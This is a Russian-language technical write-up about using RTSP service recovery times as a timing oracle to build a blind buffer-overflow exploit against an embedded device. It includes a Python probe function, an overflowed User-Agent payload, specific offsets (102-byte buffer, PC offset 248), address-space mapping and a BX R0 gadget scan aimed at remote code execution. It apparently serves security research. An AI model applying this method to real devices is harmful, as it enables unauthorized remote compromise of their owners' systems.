# Timing Oracle — как мы нашли всё без отладчика

---

## Идея

У устройства нет UART, нет SSH, нет отладочного порта. Единственная обратная связь — **время до восстановления RTSP-сервиса** после краша. Это и есть oracle.

Watchdog перезапускает RTSP-демон автоматически. Время рестарта зависит от **типа краша**:

```
Тип краша              Recovery    Тег
────────────────────────────────────────────────────
Crash в user-space     ~2.5 сек   HIT  (быстро)
Heap corruption        ~9.7 сек   HIT  (медленнее)
Kernel panic           >90 сек    PANIC (перезагрузка)
Shellcode loop (B.)    >20 сек    DEAD  (loop = RCE!)
────────────────────────────────────────────────────
```

---

## Принцип работы

```
1. Убедиться что RTSP живой    → poll OPTIONS запрос
2. Послать exploit payload     → DESCRIBE с переполненным UA
3. Начать polling              → OPTIONS каждые 0.3 сек
4. Засечь время до ответа      → это и есть тег
5. Интерпретировать тег        → вывод об адресе
```

```python
def probe(host, port, req, poll_timeout=20):
    t0 = time.time()
    tcp_send(host, port, req)           # посылаем exploit

    while time.time() < t0 + poll_timeout:
        time.sleep(0.3)
        if rtsp_alive(host, port):
            t = time.time() - t0
            return t, 'HIT' if t < 15 else 'SLOW'

    return time.time() - t0, 'DEAD'    # >20s = loop = RCE!
```

---

## Что можно измерять

### 1. Обнаружение overflow (binary search)

```
User-Agent: A * N  →  HIT?  →  увеличивай N
User-Agent: A * N  →  NONE (нет ответа вообще) → уменьшай N
```

Результат: `ua_buf = 102 байта` (103 = краш, 102 = OK).

### 2. PC_OFFSET (De Bruijn)

```
payload = cyclic(300) + ... → crash → PC = cyclic_value
PC_OFFSET = cyclic_find(PC_value) = 248
```

Без этого нужен gdb. Oracle даёт то же самое через тайминг.

### 3. Карта адресного пространства

```
For addr in 0x40000000 to 0x7F000000 step X:
    payload = A*248 + addr
    → HIT ~2.5s     → addr mapped+exec
    → PANIC >90s    → addr = MMIO или kernel
    → SLOW 15-21s   → user-space heap/stack (FP cascade)
```

Результат: вся карта памяти восстановлена без /proc/maps.

### 4. BX R0 gadget scan (ret2reg)

```
DEAD (>20s) = shellcode loop крутится = BX R0 нашли = RCE!
HIT  (<15s) = обычный краш = не гаджет
```

---

## Важный артефакт: FP cascade

Когда регистры R4–R11 содержат **user-space адреса** (< 0xC0000000), при краше процессор пытается пройти по frame pointer chain:

```
FP (R11) → *FP → *next_FP → ... → через всю mapped memory → 21 сек
```

Это создаёт **ложный DEAD** (~21с), который неотличим от настоящего DEAD (~20с+).

**Фикс**: R4–R11 = `ARM_NOP × 8` = `0xe1a01001` (> 0xC0000000 = kernel space) → немедленный kernel panic → fast HIT 2.5s вместо slow 21s.

```python
ARM_NOP  = b'\x01\x10\xa0\xe1'   # LE = 0xe1a01001  (kernel space)
reg_fill = ARM_NOP * 8            # R4–R11 → быстрый crash
```

---

## Точность

На практике наблюдаемые значения:
- `HIT` для crashed non-gadget: стабильно 2.5–6.0 сек
- `DEAD` threshold: 20 сек (с запасом)
- Ложных DEAD при правильных R4-R11: **0** из 117 проб

Oracle надёжен.
